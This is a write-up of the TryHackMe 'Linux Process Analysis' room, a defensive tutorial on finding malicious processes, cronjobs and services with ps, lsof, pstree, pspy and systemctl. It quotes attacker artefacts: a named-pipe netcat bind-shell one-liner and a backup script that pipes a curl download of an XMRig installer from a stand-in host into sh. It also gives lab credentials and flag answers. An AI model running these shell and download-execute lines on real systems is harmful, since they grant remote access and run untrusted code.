---
layout: post
title: "TryHackMe  - Linux Process Analysis"
date: 2025-09-01
tags: ["tryhackme"]
categories: [tryhackme]
hubs: "TryHackMe/Advanced Endpoint Investigations/Linux Endpoint Investigation"
identifier: "20250901T000001"
source_id: "e2097089-1a83-4fdf-9753-f9adaa79aaf7"
source_urls: "(https://tryhackme.com/room/linuxprocessanalysis)"
source_path: "Advanced Endpoint Investigations/Linux Endpoint Investigation/20250901T000001--tryhackme-linux-process-analysis__tryhackme.md"
---

{% raw %}


# TryHackMe | Linux Process Analysis

## Task 1 | Introduction

Understanding processes, services, and cronjobs is fundamental to understanding the inner workings of Linux systems. Each component has a distinct role within the system's overall functionality, from executing scheduled tasks to providing services to automate routine operations and enable user interaction. However, their crucial roles bring the potential for exploitation by malicious actors that have gained a foothold in the system. Attackers may exploit vulnerabilities or misconfigurations to escalate privileges, move laterally, establish persistent footholds, or install backdoors, further compromising the integrity and security of the system. As such, building a solid arsenal of forensic analysis techniques is increasingly important to effectively detect and mitigate threats against these components.

 Objectives

 
- Learn how to perform live forensic analysis on Linux systems, focused on determining malicious processes, services, and scripts.
- Understand how to identify common artefacts, log mechanisms, and process and service-related activities in Linux.
- Hunt malicious processes, services, and configurations to mitigate further compromise in a hands-on IR scenario.

 Pre-requisites

 To tackle live Linux forensics, having a solid grasp of the Linux operating system basics and system hardening concepts is recommended.

 
- Linux Fundamentals: [Part 1](https://tryhackme.com/room/linuxfundamentalspart1), [Part 2](https://tryhackme.com/room/linuxfundamentalspart2), and [Part 3](https://tryhackme.com/room/linuxfundamentalspart3)
- [Linux File System Analysis](https://tryhackme.com/room/linuxfilesystemanalysis)
- [Linux System Hardening](https://tryhackme.com/room/linuxsystemhardening)

### **Answer the questions below**

**Question:** I'm ready to continue!

*Answer:* 

     No answer needed

---

## Task 2 | Investigation Setup

Start MachineScenario

 Expanding our investigation from the [Linux File System Analysis](https://tryhackme.com/room/linuxfilesystemanalysis) room, we have been tasked once again by **Penguin Corp**  to perform live analysis on a Linux workstation during a suspected breach. In this scenario, our focus shifts to examining processes, services, scheduled tasks, autostart scripts, and application artefacts on the workstation. We aim to forensically analyse these components to determine any signs of unauthorised modifications, malicious activities, or persistence mechanisms.

 By analysing the leftover artefacts and identifying various persistence and backdoor mechanisms, we intend to provide Penguin Corp with a clear understanding of the extent and nature of the compromise.

 Connecting to the System

 First, click **Start Machine**  to start the VM attached to this task. The machine will start in split-view. In case the VM is not visible, click the **Show Split View**  button at the top of this room. Additionally, we will provide you with SSH credentials, that you may use if you prefer to connect from your own VPN connected machine.

  

![Image 1](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/0cbfa0d0f3a7f16cefa9fddd04b6de8d.png)

 **Username** investigator **Password** TryHackMe123! **IP Address** MACHINE_IP     Securing the Environment

 While we perform live forensic analysis on this system, it is essential to note that in this assumed scenario, we have already acquired all necessary backups and have isolated the system from the network to prevent further compromise or tampering.

 As this is a potentially compromised host, it is a good idea to ensure we are using known good binaries and libraries to conduct our information gathering and analysis. Often, this can be done by mounting a USB or drive containing binaries from a clean Debian-based installation (since the compromised workstation is Ubuntu). This has been simulated on the attached VM by copying the */bin* , */sbin* , */lib* , and */lib64*  folders from a clean installation into the */mnt/usb*  mount on the affected system.

 This effort aims to mitigate the risk of inadvertently executing malicious code or compromised utilities on systems. Suppose an attacker gains privileged access to a system. In that case, they may replace or alter existing utilities with malicious binaries or libraries that could cause further harm when run by an unsuspecting investigator. By using a trusted source, it enhances the reliability and integrity of our investigation.

 We can modify our `PATH` and `LD_LIBRARY_PATH` (shared libraries) environment variables to use these trusted binaries:

    Modifying Environment Variables to Include Trusted Paths  
```bash
investigator@tryhackme:~$ export PATH=/mnt/usb/bin:/mnt/usb/sbin
investigator@tryhackme:~$ export LD_LIBRARY_PATH=/mnt/usb/lib:/mnt/usb/lib64
```

### **Answer the questions below**

**Question:** After updating the PATH and LD_LIBRARY_PATH environment variables, run the command check-env. What is the flag that is returned in the output?

*Answer:* 

     THM{8c860435f00c943c21f6b6e0f1b2f854}

---

## Task 3 | Processes

In Linux, a *process*  is a running instance of a program. When you execute a program or command in Linux, the operating system creates a process for running that program. Each process has its unique identifier called a **Process ID (PID)** , which helps the operating system to manage and track it.

 Processes can have parent-child relationships, forming a hierarchical structure. When one process spawns another process (for example, when one shell session spawns an additional process in a subshell), the new process becomes the **child**  of the process that created it, referred to as its **parent** . This relationship is essential for managing processes and resource allocation within the operating system.

 Various tools and utilities can be employed to inspect the running processes on a system. Using this enumeration, we can seek to identify malicious activity or suspicious parent-child process relationships.

 ps

 The `ps` command is a versatile utility in UNIX-like operating systems that reports a snapshot of the active processes on the system. By default, it displays information about processes associated with the current (active running) console session, but it can also be used to gather system-wide and other user's process information. The utility retrieves this information by reading files in the `/proc` virtual filesystem, a hierarchical directory structure corresponding to each process on the running system. To run the command, simply type `ps`:

    Viewing Processes with ps  
```bash
investigator@tryhackme:~$ ps
    PID TTY          TIME CMD
   1335 pts/0    00:00:00 bash
   1745 pts/0    00:00:00 ps
```

   As seen above, the command provides its output in a table-like format with the following columns:

    **PID:**  A unique identifier (Process ID) for each process.   **TTY:**  The terminal associated with the process.   **TIME:**  The cumulative CPU time consumed by the process.   **CMD:**  The command associated with the process.    It is also possible to view processes specific to a user (Janice) by using the `-u` or `--user` option followed by the user's username:

    Viewing Janice's Processes with ps  
```bash
investigator@tryhackme:~$ ps -u janice
    PID TTY          TIME CMD
    773 ?        00:00:00 sh
    775 ?        00:00:00 abzkd83o4jakxld
    781 ?        00:00:00 cat
    782 ?        00:00:00 sh
    783 ?        00:00:00 nc
```

   A handy set of options to provide with the `ps` command is `-eFH`, which combines several options to return a comprehensive overview of all processes running on the system in a hierarchical format, regardless of the terminal or session to which they are attached. This set of options makes it a valuable tool for system monitoring and forensic analysis:

    Viewing All Processes with ps  
```bash
investigator@tryhackme:~$ ps -eFH
UID          PID    PPID  C    SZ   RSS PSR STIME TTY          TIME CMD
root           2       0  0     0     0   0 15:37 ?        00:00:00 [kthreadd]
root           3       2  0     0     0   0 15:37 ?        00:00:00   [rcu_gp]
...
root         706       1  0  2137  2740   0 22:07 ?        00:00:00   /usr/sbin/cron -f
root         769     706  0  2570  2596   0 22:08 ?        00:00:00     /usr/sbin/CRON -f
janice       773     769  0   654   516   0 22:08 ?        00:00:00       /bin/sh -c /home/janice/abzkd83o4jakxld.sh
janice       775     773  0  2156  2148   0 22:08 ?        00:00:00         /bin/bash /home/janice/abzkd83o4jakxld.sh
janice       781     775  0  1845   396   0 22:08 ?        00:00:00           cat /tmp/f
janice       782     775  0   654   452   0 22:08 ?        00:00:00           /bin/sh -i
janice       783     775  0   815   664   0 22:08 ?        00:00:00           nc -l 0.0.0.0 4444
...
ubuntu      1681       1  0 39155  5728   0 15:39 ?        00:00:00   /usr/libexec/gvfsd-metadata
```

   **Note:**  As PIDs are sequentially assigned, you will likely have different PID and PPID values listed.

 As seen in the above command, we select all processes with `-e`, return the results in extra full format `-F`, and show the process hierarchy (forest) `-H`.

 This command will produce a large output, so it is best to paginate the output by piping it to `less` or using `grep` to filter the output. However, when scrolling through the list, we can identify several suspicious processes (**781** , **782**  and **783** ) that may hint at malicious activity. We can also identify that these three processes have the parent of **PID: 775** , which is useful for our notes.

 Note again that the PIDs are sequentially generated and will be different on each machine, but in the above example, the following process command line values are worth investigating:

 `nc -l 0.0.0.0 4444`

 In this command, the Netcat utility listens on all available network interfaces (open to connections from any IP address) on port 4444. Seeing this command in a running process is suspicious as it can suggest an attempt to establish unauthorised access to the system through a **bind shell** . A bind shell works when a host binds to a specific port, awaits incoming network connections, and spawns a shell, granting the connecting entity command-line access to the host.

 `cat /tmp/f` and `/bin/sh -i`

 These two commands may suggest how the bind shell spawns its eventual command-line (`/bin/sh`) shell for whoever connects to the Netcat listener. Specifically, the file creation of `/tmp/f` suggests an attacker may have created a **named pipe**  to transmit data bidirectionally between processes, as it is a common indicator of a bind shell one-liner.

 We can further confirm that a named pipe was created by listing the file and noting the `p` file type indicator in the permissions section of the output, which denotes a named pipe:

    Listing the Named Pipe in the /tmp Folder  
```bash
investigator@tryhackme:~$ ls -l /tmp/f
prw-rw-r-- 1 janice janice 0 Mar 13 15:54 /tmp/f
```

   Putting these processes together, we can identify that the Janice user has executed a bind shell listener to provide a connecting party command-line access to the host.

 lsof

 Let's explore a more powerful way to report a list of all open files and their associated processes within the running system. `lsof` (List Open Files) is a utility that lists information about files opened by processes on a system. In this case, to view any files open by the Netcat process we identified earlier, we can run `lsof` and provide the PID (783):

    Listing Open Files with lsof  
```bash
investigator@tryhackme:~$ sudo lsof -p 783
...
COMMAND PID   USER   FD   TYPE DEVICE SIZE/OFF    NODE NAME
nc      783 janice  cwd    DIR  202,1     4096 1024049 /home/janice
nc      783 janice  rtd    DIR  202,1     4096       2 /
...
nc      783 janice    0r  FIFO   0,13      0t0   28393 pipe
nc      783 janice    1w  FIFO  202,1      0t0    3437 /tmp/f
nc      783 janice    2u   REG  202,1        0    2621 /tmp/#2621 (deleted)
nc      783 janice    3u  IPv4  28400      0t0     TCP *:4444 (LISTEN)
```

   **Note:**  Replace **783**  with the PID you identified earlier, executing `nc -l 0.0.0.0 4444`.

 The above output tells us a couple of important things. It confirms the existence of named pipes (FIFO) associated with the `/tmp/f` file, which are being written to and read from. Additionally, it indicates that the process is listening on TCP port 4444, indicating that it might be functioning as a server or a listener. This information aligns with our findings of a bind shell setup where data transmission is facilitated bidirectionally between processes using named pipes.

 Next, we should further analyse the process of parent-child relationships using `pstree`. Doing so will tell us where the process originated and provide insights into potential attack vectors.

 pstree

 `pstree` is a command-line utility that displays processes visually as a tree, showing the parent-child relationships between processes. This utility can help identify the origin of the suspicious processes and understand their relationship to other processes in the system.

 We can perform a deeper process analysis of the parent process we identified above (PID: 775) using `pstree` and provide options to list its parent processes (`-s`) and their corresponding PIDs (`-p`):

   Illustrating the Process Hierarchy with pstree  
```bash
investigator@tryhackme:~$ pstree -p -s 775
systemd(1)───cron(706)───cron(769)───sh(773)───abzkd83o4jakxld(775)─┬─cat(781)
                                                                       ├─nc(783)
                                                                       └─sh(782)
```

   **Note:**  Replace **775**  with the PID of the parent process you identified earlier.

 In the above output, we can see a hierarchical view of the process tree, where each process is listed along with its parent process and PID. From this tree, we can see that the Netcat (nc) process was spawned by intermediary processes (**abzkd83o4jakxld**  and **sh** ), which are executing scripts spawned by a cronjob (cron).

 Now that we have a better idea of how the Netcat process was spawned, we can focus on the parent shell and cron processes to see the commands that were run. To do this, we can return to the `ps` command in full-format listing (`-f`) and filter by those specific PIDs we found in the `pstree` output:

    Listing Processes with ps  
```bash
investigator@tryhackme:~$ ps -f 769 773 775 783
UID          PID    PPID  C STIME TTY      STAT   TIME CMD
root         769     706  0 22:08 ?        S      0:00 /usr/sbin/CRON -f
janice       773     769  0 22:08 ?        Ss     0:00 /bin/sh -c /home/janice/abzkd83o4jakxld.sh
janice       775     773  0 22:08 ?        S      0:00 /bin/bash /home/janice/abzkd83o4jakxld.sh
janice       783     775  0 22:08 ?        S      0:00 nc -l 0.0.0.0 4444
```

   **Note:**  Replace **769** , **773** , **775** , and **783**  with the PIDs you identified with `pstree`.

 This output concludes that a suspicious shell script (`abzkd83o4jakxld.sh`) has been executed from the `/home/janice` directory. If we view the contents of this file, we can confirm that it matches the indicators of a common bind shell one-liner, as discussed earlier:

    Viewing the Contents of the Suspicious .sh Script  
```bash
investigator@tryhackme:~$ cat /home/janice/abzkd83o4jakxld.sh 
#!/bin/bash

# Set the path to the lock file
LOCKFILE="/tmp/abzkd83o4jakxld.lock"

# Check if lock file exists
if [ -e "$LOCKFILE" ]; then
    echo "Script is already running. Exiting."
    exit 1
fi

# Create lock file
touch "$LOCKFILE"

# Main command
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 4444 > /tmp/f

# Remove lock file
rm -f "$LOCKFILE"
```

   In summary, this main command sequence (under # Main command) creates a named pipe, reads from it, and passes the data to a shell (`/bin/sh`) in interactive mode (`-i`). The remaining bits of the file seem complicated, but establishing a **lock file**  is just one way to ensure that only one instance of the bind shell runs at a time. The attacker of this scenario likely set up this command sequence to establish persistence and enable future remote connections for malicious activities.

 top

 So far, we've explored static snapshots of running processes using commands like `ps` and `pstree`. While these tools provide valuable insights into the system's current state, they lack real-time monitoring capabilities. `top` provides a continuously updated display of system processes sorted by various criteria, such as CPU or memory usage. It dynamically refreshes its output, allowing you to observe real-time changes. It also offers a powerful interactive interface to sort and filter processes on the fly.

 We can filter the output to only show processes related to the "Janice" user (`-u janice`), update dynamically every 5 seconds (`-d 5`), and display the full command paths (`-c`):

   Listing Real-Time Processes with top  
```bash
investigator@tryhackme:~$ top -d 5 -c -u janice
...
    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND                                                                                                                                     
    773 janice    20   0    2616    516    448 S   0.0   0.1   0:00.00 /bin/sh -c /home/janice/abzkd83o4jakxld.sh                                                                                                  
    775 janice    20   0    8624   2148   1904 S   0.0   0.2   0:00.00 /bin/bash /home/janice/abzkd83o4jakxld.sh                                                                                                   
    781 janice    20   0    7380    396    328 S   0.0   0.0   0:00.03 cat /tmp/f                                                                                                                                  
    782 janice    20   0    2616    452    388 S   0.0   0.0   0:00.00 /bin/sh -i                                                                                                                                  
    783 janice    20   0    3260    656    568 S   0.0   0.1   0:00.00 nc -l 0.0.0.0 4444
```

   You can press the `q` key to exit this view.

 Identifying Suspicious Parent-Child Process Relationships

 Identifying suspicious parent-child process relationships is essential to the IR process and can quickly confirm or rule out malicious activity. The best way to recognise what is abnormal is to establish a baseline for normal behaviour specific to your systems, environment, and organisation. This baseline should include typical processes, relationships, and resource usage under normal operating conditions.

 For example, if an Apache web server process owned by the standard *www-data*  user spawns a bash child process, it could indicate malicious activity such as a command injection or remote code execution. In a typical web server environment, the Apache process handles incoming HTTP requests and serves web pages or executes server-side scripts, usually within a restricted environment. However, if a bash shell is spawned as a child process of the Apache server process, it suggests that the server may have been compromised or that malicious code is being executed.

 In most cases, monitoring tools and SIEM solutions can be tuned proactively to baseline the typical behaviour of the system and alert on process and process relationship occurrences that stray from this baseline.

### **Answer the questions below**

**Question:** Which command lists all open files and the processes that opened them?

*Answer:* 

     lsof

**Question:** Use pstree to list out the process hierarchies. What is the name of the nc processes parent?

*Answer:* 

     abzkd83o4jakxld

---

## Task 4 | Cronjobs

Cronjobs are scheduled tasks executed automatically at predefined intervals by the **cron daemon** . The cron daemon is a background process responsible for managing cronjobs based on configuration files known as crontabs. Users can have their crontab file stored in the `/var/spool/cron/crontabs` directory. The main crontab file at `/etc/crontab` governs system-wide cronjobs.

 Below is a brief refresher on cronjobs and their syntax. For a more detailed look into Linux cronjobs, go through the [Linux Fundamentals Part 3](https://tryhackme.com/room/linuxfundamentalspart3) room.

 Cron entries follow a specific format consisting of space-separated fields. Let's first look at an example crontab file for a user named **Bob** . Typically, this file would be located in `/var/spool/cron/crontabs/bob`:

    Example Cron Entry  
```bash
10 05 * * * /home/bob/backup_tmp.sh
```

   This cron schedule consists of five fields followed by the command to execute:

 
- **Minute (10):**  The first field specifies the minute when the command will be executed. In this case, it's **10** , indicating that the command will be executed at the 10th minute of the hour.
- **Hour (05):**  The second field specifies the hour when the command will be executed. It's **05** , indicating that the command will be executed at 5:10 AM.
- **Day of the Month (*):**  The third field specifies the day of the month when the command will be executed. In this case, it's ***** , a wildcard value, meaning it will be executed every day of the month. You can also specify a specific day of the month using numbers from 1 to 31. For example, to execute the command on the 15th day of every month, you would use **15** .
- **Month (*):**  The fourth field specifies the month when the command will be executed. Here, it's also ***** , meaning the command will be executed monthly. You can specify months using either numbers (1 for January, 2 for February, etc.) or shorthand names (**Jan**  for January, **Feb**  for February, etc.). For example, you can use either **2**  or **Feb**  to execute the command only in February.
- **Day of the Week (*):**  The fifth field specifies the day of the week the command will be executed. In this case, it's ***** , which means the command will be executed every day of the week. You can also specify days of the week using numbers from 0 to 7, where 0 and 7 represent Sunday, 1 represents Monday, and so on. Alternatively, you can use the shorthand names (Sun, Mon, Tue, etc.). For example, you can use either **1**  or **Mon** .
- **Command (** `/home/bob/backup_tmp.sh`**):**  The final field contains the command to be executed.

 Additionally, it's important to note that the system-level `/etc/crontab` differs from user-level crontabs. System-wide crontabs will include an additional field specifying the user under which the command will run (i.e., *root*  or *www-data* ).

 Putting it all together, the cron schedule is configured to execute the command `/home/bob/backup_tmp.sh` at 5:10 AM every day.

 For thorough documentation on reading and creating Cron expressions, check out [Crontab Guru](https://crontab.guru/).

 Cronjobs, while essential for automating tasks, can also be a target for attackers seeking to establish persistence or escalate privileges on a system. Therefore, it's crucial for incident responders and forensic analysts to know how to analyse the system for any suspicious cronjobs or scheduled tasks.

 Cron Configuration Files

 We can begin our investigation into cronjobs on the system by first taking inventory of the system's cron configuration files. Fortunately, this process is relatively straightforward as these files are typically stored in known locations.

 **/etc/crontab**

 Firstly, let's focus on `/etc/crontab`, the main repository for system-wide cronjobs. Administrators can configure tasks that require elevated privileges within this file, often executing commands as the root user. To view this file, we can `cat` its contents:

    Viewing /etc/crontab  
```bash
investigator@tryhackme:~$ cat /etc/crontab
...
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
...
*/5 * * * * root /var/tmp/backup
```

   The above contents of `/etc/crontab` show the default shell and path variables used to execute commands. Below that, we can see a single cronjob entry:

 `*/5 * * * * root /var/tmp/backup`

 By reading the syntax above, we can determine that the `/var/tmp/backup` file will execute every five minutes as root. The `*/5` is a way within cron's syntax to specify every fifth minute.

 This finding invokes immediate suspicion as a system-level cronjob executes a command with root privileges in the `/var/tmp` directory. This is a world-writable directory, meaning that any user can modify or replace the `backup` file that is being executed. This could be a misconfiguration that an attacker abused to escalate privileges or a persistence method created by the attacker after gaining root access to the system.

 When viewing the contents of this `backup` file, we can determine suspicious additions to the script:

    Viewing the Contents of /var/tmp/backup  
```bash
investigator@tryhackme:~$ cat /var/tmp/backup
#!/bin/bash

tar -czf web_backup.tar.gz /var/www/html && curl -sSL http://h4x0rcr7pt.thm/install-xmrig.sh | sh
```

   Although the backup script initially appears to perform a legitimate backup operation, an additional command has been appended to download and execute an install script via `curl`. From the name of the script, it appears to be related to the XMRig cryptocurrency mining software and warrants further investigation. This example illustrates a common tactic attackers use to leverage compromised systems for unauthorised cryptocurrency mining.

 Next, additional system cronjob directories are important for a thorough analysis. These directories are found under the `/etc/` directory with the following naming convention:

 
- **/etc/cron.hourly/**  - System cronjobs that run once per hour.
- **/etc/cron.daily/**  - System cronjobs that run once per day.
- **/etc/cron.weekly/**  - System cronjobs that run once per week.
- **/etc/cron.monthly/**  - System cronjobs that run once per month.
- **/etc/cron.d/**  - Additional custom system cronjobs.

 With these locations in mind, we can list out any configured cronjobs with the `ls` command:

    Listing Additional Cronjobs  
```bash
investigator@tryhackme:~$ ls /etc/cron.d
anacron  e2scrub_all  popularity-contest
investigator@tryhackme:~$ ls /etc/cron.hourly
beacon
investigator@tryhackme:~$ ls /etc/cron.daily
0anacron  apt-compat    cracklib-runtime  logrotate  popularity-contest
apport    bsdmainutils  dpkg              man-db     update-notifier-common
investigator@tryhackme:~$ ls /etc/cron.weekly
0anacron  man-db  update-notifier-common
investigator@tryhackme:~$ ls /etc/cron.monthly
0anacron
```

   In the output above, most of these cronjobs look benign - however, it's always important to investigate their contents to be sure. Similar to processes, this is why it's always essential to have a pre-established baseline in order to spot anomalies quickly.

 **/var/spool/cron/crontabs/**

 After investigating the system-level cronjobs, we can look at the various user-level cronjobs configured by users on the system. User-level cronjobs are specific to individual user configuration files and are managed independently of system-wide cronjobs. We can navigate to the `/var/spool/cron/crontabs/` directory. Each user with permission to use cron will have their file inside this directory, named after their username.

 There are several ways to enumerate this information. The easiest way is to list the contents of the directory with sudo-privileges:

    Listing User-Level Cronjobs  
```bash
investigator@tryhackme:~$ sudo ls -al /var/spool/cron/crontabs/
total 28
drwx-wx--T 2 root   crontab 4096 Mar 13 00:05 .
drwxr-xr-x 5 root   root    4096 Oct 26  2020 ..
-rw------- 1 bob    crontab 1157 Mar 13 00:05 bob
-rw------- 1 elijah crontab 1122 Mar 13 00:02 elijah
-rw------- 1 janice crontab 1132 Mar 12 23:38 janice
-rw------- 1 root   crontab 1122 Mar 12 23:45 root
-rw------- 1 ubuntu crontab 1225 Feb 27  2022 ubuntu
```

   As seen in the above output, user-level cronjobs have been configured by several users on the system.

 We can view the contents of these files separately (using `cat`) to analyse their contents, or we could use the `crontab` command. This command can manage, create, or view user-level cronjobs. The `-u` argument can be used to specify a specific user's cron configuration, and the `-l` argument can be used to display the contents of the cronjob. To view **Janice** 's cronjobs, we can run:

    Viewing Janice's Configured Cronjobs  
```bash
investigator@tryhackme:~$ sudo crontab -l -u janice
...
# m h  dom mon dow   command
* * * * * /home/janice/abzkd83o4jakxld.sh
```

   As seen in the above output, we have discovered the specific cronjob that executes the `abzkd83o4jakxld.sh` bind shell, which we identified in the previous task.

 Using a clever one-liner command, we can quickly loop through the users on the system and identify if they have any user-level cronjobs configured. If so, we can output the contents of the cronjob entry to the terminal. This type of hybrid automation can help speed up investigations and ensure thorough coverage:

    Using a One-Liner to List User Cron Entries  
```bash
investigator@tryhackme:~$ sudo bash -c 'for user in $(cut -f1 -d: /etc/passwd); do entries=$(crontab -u $user -l 2>/dev/null | grep -v "^#"); if [ -n "$entries" ]; then echo "$user: Crontab entry found!"; echo "$entries"; echo; fi; done'
...
janice: Crontab entry found!
* * * * * /home/janice/abzkd83o4jakxld.sh

bob: Crontab entry found!
10 05 * * * /home/bob/backup_tmp.sh
30 04 * * * /var/tmp/findme.sh
...
```

   To break down this command, we are iterating over all of the users on the system by filtering out the entries in `/etc/passwd`. From each of these returned users, it iterates each user and fetches their crontab entries using the `crontab` command we ran earlier. If a crontab entry exists for that user, we will return their username and the entry from the crontab file.

 As seen in the above output, we have quickly determined the values of multiple users' crontab entries.

 Cron Execution Logs

 Cron logs record the execution of scheduled tasks managed by the cron daemon and provide a chronological record of when cron jobs were executed, along with any associated output or error messages. From a forensic standpoint, these logs can be invaluable in uncovering execution artefacts of cronjobs and lead to discovering suspicious activities or system compromises. For example, suppose a malicious actor abused an existing cronjob or created a malicious cronjob and attempted to cover their tracks. In that case, the logs might reveal unusual patterns of execution or unexpected commands being run.

 On Debian-based systems, cron execution logs are typically stored in `/var/log/syslog`. This file aggregates system logs, including messages from the cron daemon. In some Linux distributions, such as Red Hat Enterprise Linux (RHEL) and CentOS, these logs may be found in the aptly named `/var/log/cron`.

 Because the system we're investigating stores cron logs in the **syslog**  file, we can `grep` the contents and filter for any logs related to cron:

    Filtering Syslog for Cron Logs  
```bash
investigator@tryhackme:~$ sudo grep cron /var/log/syslog
```

   The above command will produce a large amount of output. It is a good idea to filter the results further based on specific criteria to focus on relevant information. Some example ideas to filter on include:

    Filtering Syslog for Failed Cron Logs  
```bash
investigator@tryhackme:~$ sudo grep cron /var/log/syslog | grep -E 'failed|error|fatal'
```

   The above command will filter out cron entries associated with failed job executions. In this case, there are no results - but this can be a useful method to catch anomalies.

 We can also filter for specific users:

    Filtering Syslog for Bob's Cron Logs  
```bash
investigator@tryhackme:~$ sudo grep cron /var/log/syslog | grep -i 'bob'
Mar 13 00:04:35 tryhackme crontab[3016]: (root) LIST (bob)
Mar 13 00:05:17 tryhackme crontab[3053]: (bob) BEGIN EDIT (bob)
Mar 13 00:05:45 tryhackme crontab[3053]: (bob) END EDIT (bob)
Mar 13 00:05:47 tryhackme crontab[3058]: (bob) BEGIN EDIT (bob)
Mar 13 00:05:59 tryhackme crontab[3058]: (bob) REPLACE (bob)
Mar 13 00:05:59 tryhackme crontab[3058]: (bob) END EDIT (bob)
Mar 13 00:06:01 tryhackme cron[704]: (bob) RELOAD (crontabs/bob)
Mar 13 00:06:32 tryhackme crontab[3259]: (root) LIST (bob)
```

   The above command will filter cron entries specifically associated with **Bob** . Note that in the above output, we can even see the timestamps of when Bob's crontab file was modified.

 Pspy

 [Pspy](https://github.com/DominicBreuker/pspy) is a powerful open-source tool used to monitor Linux processes without the need for root privileges. It is designed to capture and display real-time information about running processes, including their execution commands, user IDs, process IDs (PIDs), parent process IDs (PPIDs), timestamps, and other relevant details. It operates by reading data directly from the `/proc` virtual filesystem, providing real-time insights into process activity without modifying system files or requiring elevated permissions.

 While it's excellent for enumeration purposes, incident responders can benefit from its ability to collect execution artefacts and catch short-lived processes. Due to its real-time monitoring, it can also detect processes generated by various cronjobs through the system, giving us more insight into which processes occur when cronjobs are run.

 In this system, Pspy has been pre-installed along with the mounted binaries we have been using. As such, it is in our path and can be called simply by running `pspy64`. It will begin to monitor in real time, and we should let it run for a few minutes to capture events. It can be stopped by pressing `Ctrl + C`:

    Using pspy64 to Monitor Executions  
```bash
investigator@tryhackme$ pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)

Draining file system events due to startup...
done
...
2024/03/13 19:38:45 CMD: UID=0     PID=1      | /sbin/init 
2024/03/13 19:39:01 CMD: UID=0     PID=3396   | /usr/sbin/CRON -f 
2024/03/13 19:39:01 CMD: UID=1003  PID=3403   | /bin/bash /home/janice/abzkd83o4jakxld.sh 
2024/03/13 19:39:01 CMD: UID=1003  PID=3402   | /bin/sh -i 
2024/03/13 19:39:01 CMD: UID=1003  PID=3401   | /bin/bash /home/janice/abzkd83o4jakxld.sh
```

   **Note:**  The output may appear stalled or paused for a few moments as it initialises.

 This command will produce a large amount of continuous output as normal system operations occur. However, we can quickly note that the cronjobs on the system that we identified previously (such as `/bin/bash /home/janice/abzkd83o4jakxld.sh`) are detected.

### **Answer the questions below**

**Question:** Search around the system for suspicious system-level cronjob entries. What is the full URL of the C2 server?

*Answer:* 

     http://c2.intelligent-software.thm:8310/beacon

**Question:** List the user-level cronjobs in the system. What is the hidden flag in one of the scripts?

*Answer:* 

     THM{4682786cf2d92f01c4d30a2bbf4621f7}

**Question:** Use pspy64 to monitor executions occurring through the system. What is the decoded flag value that is echoed every 15 seconds?

*Answer:* 

     THM{851a981445dbfb9485c3771510a53568}

---

## Task 5 | Services

In Linux, services refer to various background processes or daemons that run continuously, performing tasks such as managing system resources, providing network services, or handling user requests. For example, the cron daemon we analysed previously ran the cronjobs. Other common services include SSH (sshd) for secure shell or the Apache HTTP Server (httpd). Typically, services are configured using the system's service management utility - **systemd**  or **init** . Some environments like BusyBox, however, do not use systemd.

 Services can be a target for attackers if they can exploit vulnerabilities, abuse misconfigurations, or manipulate legitimate services to establish persistence or escalate privileges on the system. For example, attackers might create new malicious services or modify existing ones to inject or execute malicious commands during system startup or ad-hoc if they can start and stop the service.

 As such, incident responders need to have a pre-established baseline to detect anomalies and locate artefacts related to service abuse.

 Enumerating Services

 `systemctl` is a utility in Linux used for controlling **systemd**  and service managers. As mentioned earlier, systemd is a service management utility in Unix-based systems and, for the most part, has replaced the traditional init system in many distributions. As such, systemd is responsible for managing the startup processes, services, and daemons on a Linux system, and `systemctl` lets us manage these services directly.

 We can perform a number of actions using `systemctl`, including:

    `systemctl start <service>` Starts the specified service.   `systemctl stop <service>` Stops the specified service.   `systemctl restart <service>` Restarts the specified service.   `systemctl enable <service>` Enables the specified service to start automatically at boot.   `systemctl disable <service>` Disables the specified service from starting automatically at boot.   `systemctl status <service>` Displays the status of the specified service (e.g., Active, Inactive, Failed).    We can also use `systemctl` to iterate and query all the services on the system using the following syntax:

    Listing All System Services  
```bash
investigator@tryhackme:~$ sudo systemctl list-units --all --type=service
```

   This will produce a lot of paginated output. You can exit this window by pressing the `q` key or avoid pagination by including the `--no-pager` argument.

 Alternatively, we can limit the output to just currently running services with the following command:

    Listing Running Services  
```bash
investigator@tryhackme:~$ sudo systemctl list-units --type=service --state=running
  UNIT                                           LOAD   ACTIVE SUB     DESCRIPTION                                                   
  accounts-daemon.service                        loaded active running Accounts Service                                              
  acpid.service                                  loaded active running ACPI event daemon                                                                                     
  atd.service                                    loaded active running Deferred execution scheduler                                  
  b4ckd00rftw.service                            loaded active running                                
  cron.service                                   loaded active running Regular background
  ...
```

   For the most part, the services returned are seemingly benign. However, we can't be sure as we only see the service name and descriptions based on their unit files. However, at this stage, we are looking for additional services that appear out of place or deviate from the standard baseline. The above output shows an interesting service with the name `b4ckd00rftw.service`, which warrants further investigation.

 Investigating Service Processes and Binaries

 Now that we have identified a suspicious service, we can use `systemctl` to query the service's status, metadata, and other configurations to understand better what the service is doing.

 To query the service's status, we can use the following command:

    Viewing the Backdoor Service  
```bash
investigator@tryhackme:~$ sudo systemctl status b4ckd00rftw.service
b4ckd00rftw.service - Backdoor Service
     Loaded: loaded (/etc/systemd/system/b4ckd00rftw.service; enabled; vendor preset: enabled)
     Active: active (running) since Wed 2024-03-13 18:38:06 UTC; 1h 20min ago
   Main PID: 596 (b4ckd00rftw.sh)
      Tasks: 2 (limit: 1126)
     Memory: 6.4M
     CGroup: /system.slice/b4ckd00rftw.service
             ├─ 596 /bin/bash /usr/local/bin/b4ckd00rftw.sh
             ├─4067 sleep 60
```

   In the above output, we gain a lot of details about the **b4ckd00rftw**  service. Notably, we can see that it is in the **Active**  and **Running**  state, as well as the timestamp for when the service started previously.

 The command has also returned the **Main PID**  value, which identifies the main process of this service and its associated executable (**b4ckd00rftw.sh** ). Moving further, we gain valuable information with the **CGroup**  (Control Group) field, which returns two processes spawned from this service.

